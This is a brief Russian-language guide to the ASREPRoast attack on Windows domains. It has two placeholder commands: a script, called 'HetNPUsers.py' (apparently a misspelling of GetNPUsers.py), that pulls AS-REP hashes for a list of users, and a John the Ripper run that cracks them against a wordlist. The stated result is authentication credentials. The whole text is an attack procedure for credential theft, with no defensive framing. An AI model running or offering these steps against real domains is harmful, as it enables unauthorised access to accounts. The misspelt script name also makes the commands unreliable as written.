# **ASREPRoast**

**ASREPRoast attack guide**

**Инструкция:**

- Запускаем, указав формат для получаемых хэшей.

`# python3 HetNPUsers.py <domain.net> -userfile <users_list> -format john -outputfile <filename>`

- С помощью John The Ripper перебираем хэши.

`john <hash_file> -wordlist=<dictionary>`


**Результат:**

Учетные данные для аутентификации.
